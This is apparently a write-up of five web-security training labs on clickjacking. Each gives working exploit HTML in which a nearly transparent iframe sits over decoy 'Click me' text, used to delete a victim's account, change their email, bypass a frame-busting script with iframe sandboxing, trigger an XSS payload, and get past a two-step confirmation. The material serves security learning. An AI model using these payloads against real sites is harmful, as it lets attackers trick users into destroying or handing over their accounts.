1. This lab is a basic clickjacking example where the goal is to enduce the victim into deleting their account. The following page on the exploit server worked in my case to make the work `Click` line up with the delete account button (change the opacity to `0.5` if you want to see what is happening):
```
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click</div>
<iframe src="https://acfb1fbf1ec19ac6c063a0d400a0001c.web-security-academy.net/my-account"></iframe>
```
2. This lab is the same as the previous, but is instead trying to change the victim's email. This can be done because the site allows pre-filling the form via the `email` GET parameter. As such, the following exploit works:
```
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://ac421f791f95da94c06574a500c5005a.web-security-academy.net/my-account?email=fake@email.com"></iframe>
```
3. This lab is the same as the previous, but it uses javascript in order to prevent the page from being framed. It does so by checking if the current page is the top level page, and if not overriding the page contents with an error message. However, by using iframe sandboxing, we can prevent that javascript from ever being run. This results in the following exploit:
```
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://acd51fca1fbaf41fc177033e001100d4.web-security-academy.net/my-account?email=fake@email.com" sandbox="allow-forms"></iframe>
```
4. This lab has DOM based XSS in the feedback submission form. When it is submitted, the name field is reflected into the page in an unsafe manner. Because this form support prefilling, it is susceptible to a clickjacking based XSS attack. The following payload sets up the clickjacking attack:
```
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:625px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://ac541f841f68b04bc0e021d2001e008e.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=print()%3E&email=asdf@asdf.asdf&subject=asdf&message=asdf#feedbackResult"></iframe>
```
When the `Click me` text is clicked, the XSS will trigger and call the `print` function from within the context of the target website
5. This lab is similar to the previous, but the delete account functionality has a confirmation button in order to make clickjacking harder. As such, there must be 2 decoy on the page, one which overlaps with the initial button and a second that lines up with the confirmation button. The following exploit sets up the attack:
```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:220px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://ac651fab1ed9b18cc19686d90052002e.web-security-academy.net/my-account"></iframe>
```
